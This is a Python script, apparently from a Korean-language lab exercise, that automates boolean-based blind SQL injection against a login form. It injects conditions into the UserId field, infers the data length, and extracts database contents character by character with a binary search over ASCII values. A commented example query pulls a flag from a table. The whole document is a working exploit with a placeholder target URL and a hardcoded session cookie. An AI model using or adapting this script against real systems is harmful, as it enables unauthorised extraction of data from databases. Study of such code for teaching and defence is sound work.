# step 6. 2진 탐색 알고리즘 적용
import urllib.request
import urllib.parse
import re

def blindSqli(query):
	# 본인 실습 시스템의 URL 경로를 입력하세요!
	url = ""

	param = "' and {} and '1'='1".format(query)

	data = {'UserId': 'mario'+param,'Password':'mariosuper','Submit':'Login'}
	data = urllib.parse.urlencode(data).encode()
	cookie = 'PHPSESSID=nn91fov2c3j46bbaa9mb88qdft;'
	req = urllib.request.Request(url, data=data)
	
	req.add_header('cookie',cookie)

	response = urllib.request.urlopen(req)
	res_text = response.read().decode()

	chk = re.findall('User Name : mario', res_text)
	if(chk):
		return True
	else:
		return False


def check_length(sql_query):

	for i in range(0,20):
		query = "length((" + sql_query + ")) = " + str(i)
		res = blindSqli(query)

		if(res):
			return i

	return 0

def cmp_bigger(i,j,sql):
	query = "(ascii(substring(("+sql+"),"+ str(i)+",1))) > " + str(j)
	res = blindSqli(query)

	return res	

def cmp_same(i,j,sql):

	query = "(ascii(substring(("+sql+"),"+ str(i)+",1))) = " + str(j)
	res = blindSqli(query)

	return res

print("SQL Injection Data 추출 프로그램.")
sql_query = input("SQL > ")

#sql_query = "select flag from flag_table limit 0,1"
data_len = check_length(sql_query)

extracted_data = ""

for i in range(1,data_len+1):
	start_idx = 33
	end_idx = 127
	mid_idx = 60

	while(True):
		if(start_idx >= mid_idx):
			if(cmp_same(i,end_idx, sql_query)):
				print("Extracted Data : " + extracted_data, end="\r")
				extracted_data += chr(end_idx)
				break

		cmp_res = cmp_bigger(i, mid_idx, sql_query)

		if(cmp_res == True):
			start_idx = mid_idx
			mid_idx = int((mid_idx + end_idx) / 2)
		else:
			end_idx = mid_idx
			mid_idx = int((start_idx + mid_idx) / 2)

print("Extracted Data : " + extracted_data)